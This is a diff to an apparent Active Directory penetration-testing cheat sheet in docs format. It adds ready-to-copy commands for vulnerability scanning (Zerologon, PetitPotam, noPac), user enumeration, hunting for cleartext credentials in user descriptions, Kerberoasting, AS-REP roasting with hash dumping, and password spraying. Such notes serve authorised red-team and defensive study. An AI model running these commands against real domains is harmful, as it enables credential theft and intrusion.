@@ -1,9 +1,9 @@
 import { Tab, Tabs } from 'nextra-theme-docs'
  
 ## Scan for vulnerabilities
-```bash
+```bash filename="Crackmapexec" {2,5,9}
 # Zerologon
-crackmapexec smb <ip> -u '' -p '' -M zerologo
+crackmapexec smb <ip> -u '' -p '' -M zerologon
 
 # PetitPotam
 crackmapexec smb <ip> -u '' -p '' -M petitpotam
@@ -17,7 +17,7 @@ crackmapexec smb <ip> -u 'user' -p 'pass' -M nopac
 #### Domain Enumeration
 <Tabs items={['PowerView', 'ADModule']}>
   <Tab>
-    ```powershell "
+    ```powershell filename="PowerView" {2,5,8}
       # Get info about the domain
       Get-NetDomain
 
@@ -29,7 +29,7 @@ crackmapexec smb <ip> -u 'user' -p 'pass' -M nopac
     ```
   </Tab>
   <Tab>
-    ```powershell "
+    ```powershell filename="ADModule" {2,5,8,11}
       # Get info about the domain 
       Get-ADDomain
 
@@ -52,59 +52,93 @@ crackmapexec smb <ip> -u 'user' -p 'pass' -M nopac
 
 
 #### Domain Policy Enumeration
-```powershell filename="ADModule"
-Get-DomainPolicy
 
-# Get domain policy for system access
-(Get-DomainPlicy)."system access"  
-(Get-DomainPlicy)."kerberos policy"
-```
+Domain Password Policy
+https://www.windows-active-directory.com/active-directory-password-policies.html#:~:text=You%20can%20view%20the%20default%20password%20policy%20using%20one%20of%20two%20ways.&text=Go%20to%20Start%20Menu%20→,policies%20have%20to%20be%20set.
+
+
+<Tabs items={['ADModule', 'CME']}>
+  <Tab>
+    ```powershell 
+      Get-DomainPolicy
+
+      # Get domain policy for system access
+      (Get-DomainPlicy)."system access"  
+      (Get-DomainPlicy)."kerberos policy"
+    ```
+  </Tab>
+  <Tab>
+    ```bash 
+      # Get info about the domain password policy
+      crackmapexec smb DC-IP -u '' -p '' --pass-pol
+    ```
+  </Tab>
+
+ 
+</Tabs>
 
 #### User Enumeration
-```powershell filename="PowerView"
-# Get info about a specific user
-Get-Netuser -username user1
-
-# To select a specific property
-Get-NetUser | select -ExpandProperty samaccoutname
-
-
-# The properties are usesful in defend and detection, or in redteaming to know decoy users and honey credentials used to decieve attackers
-
-# Get all properties for all domain users
-Get-UserProperty
-
-# Shows password last set time
-Get-UserProperty -Properties pwdlastset
-
-# Number of bad password entries
-Get-UserProperty -Properties badpwdcount
-
-Get-UserProperty -Properties logoncount
-
-# The Description propertiy sometimes contains cleartext creds, so make sure to have a look on it  
-Get-UserField -SearchField Description -SearchTerm "built"
-
-# Get group membership of a user
-get-NetGroup -Username 'user'
+##### Un-Authenticated
+```bash filename="Crackmapexec" copy
+# Enumerate usernames without domain credentials using a wordlist of common usernames
+kerbrute  userenum usernames.txt --dc dc-ip -d domain.local  
 ```
+##### Authenticated
+<Tabs items={['PowerView', 'ADModule']}>
+  <Tab>
+    ```powershell filename="PowerView"
+      # Get info about a specific user
+      Get-Netuser -username user1
 
-```powershell filename="ADModule"
-# Get info about current user
-Get-ADUser -Filter * -Properties *
+      # To select a specific property
+      Get-NetUser | select -ExpandProperty samaccoutname
 
-# For a specific user
-Get-ADUser -Identity username -Properties *
 
-# Get Description property
-Get-ADUser -Filter 'Description like "*built*"' -Properties Description | select name, Description
+      # The properties are usesful in defend and detection, or in redteaming to know decoy users and honey credentials used to decieve attackers
 
-# Get group membership of a user
-Get-ADPrincipalGroupMembership -Identity username
-```
+      # Get all properties for all domain users
+      Get-UserProperty
+
+      # Shows password last set time
+      Get-UserProperty -Properties pwdlastset
+
+      # Number of bad password entries
+      Get-UserProperty -Properties badpwdcount
+
+      Get-UserProperty -Properties logoncount
+
+      # The Description propertiy sometimes contains cleartext creds, so make sure to have a look on it  
+      Get-UserField -SearchField Description -SearchTerm "built"
+
+      # Get group membership of a user
+      get-NetGroup -Username 'user'
+      ```
+  </Tab>
+  <Tab>
+    ```powershell filename="ADModule"
+    # Get info about current user
+    Get-ADUser -Filter * -Properties *
+
+    # For a specific user
+    Get-ADUser -Identity username -Properties *
+
+    # Get Description property
+    Get-ADUser -Filter 'Description like "*built*"' -Properties Description | select name, Description
+
+    # Get group membership of a user
+    Get-ADPrincipalGroupMembership -Identity username
+    ```
+  </Tab>
+
+ 
+</Tabs>
+
+
+
+
 
 #### User Hunting
-```powershell filename="Using  PowerView"
+```powershell filename="PowerView"
 # Get active logged-on users on a computer (Note: must have Local Admin privs on that machine)
 Get-NetLoggedOn -ComputerName computer_name
 
@@ -275,21 +309,75 @@ Find-PSRemotingLocalAdminAccess
 ```
 
 
-#### Local File Searching
-```
-
-```
-
-#### Local Privelege Escalation
-```
-
-```
-
 #### Forest Enumeration
 ```
 
 ```
 
+## Domain attacks
+
+### Kerberoasting
+<Tabs items={['Rubeus.exe', 'Impacket']}>
+  <Tab>
+    ```powershell 
+      
+    ```
+  </Tab>
+  <Tab>
+    ```bash copy
+      GetUserSPNs.py domain.local/user:P@ssw0rd1 -request -dc-ip 20.20.20.20
+    ```
+  </Tab>
+
+</Tabs>
+
+### AS-Reproasting
+
+<Tabs items={['Rubeus.exe', 'Impacket','Kerbrute']}>
+  <Tab>
+    ```powershell {2,5,8}
+    # From a domain-joined machine
+    .\Rubeus.exe asreproast /outfile:as-reproast-output.txt /format:hashcat
+
+    # For a specific user
+    .\Rubeus.exe asreproast  /format:hashcat /user:webadmin
+
+    # For a list of vulnerable users
+    type .\reproastable-users.txt | .\Rubeus.exe asreproast /user:$_ /format:hashcat
+    ```
+  </Tab>
+  <Tab>
+    ```bash copy
+    # Use domain creds to extract vulnerable users then target them
+    GetNPUsers.py domain.local/username:P@ssw0rd -request -format hashcat -outputfile hashes.asreproast
+
+    # Target list of users
+    GetNPUsers.py -usersfile ./domain_usernames.txt -dc-ip 20.20.20.20 domain.local/ -outputfile as-reproasting.txt -format hashcat
+    ```
+  </Tab>
+  <Tab>
+  ```bash
+  # kerbrute checks for pre-authentication, if doesn't exist it automatically dumps the user hash to crack offline
+  kerbrute userenum usernames.txt --dc dc-ip -d domain.local
+  ```
+  </Tab>
+
+</Tabs>
+
+### Password Spray
+
+<Tabs items={['Kerberos', 'SMB']}>
+  <Tab>
+    ```bash  copy
+    kerbrute  passwordspray -d domain.local --dc dc-ip users.txt 'P@ssw0rd'
+    ```
+  </Tab>
+  <Tab>
+    ```bash copy
+    crackmapexec smb dc-ip users.txt 'P@ssw0rd' 
+    ```
+  </Tab>
+</Tabs>
 
 ## Microsoft Services Enumeration and Attacking
 
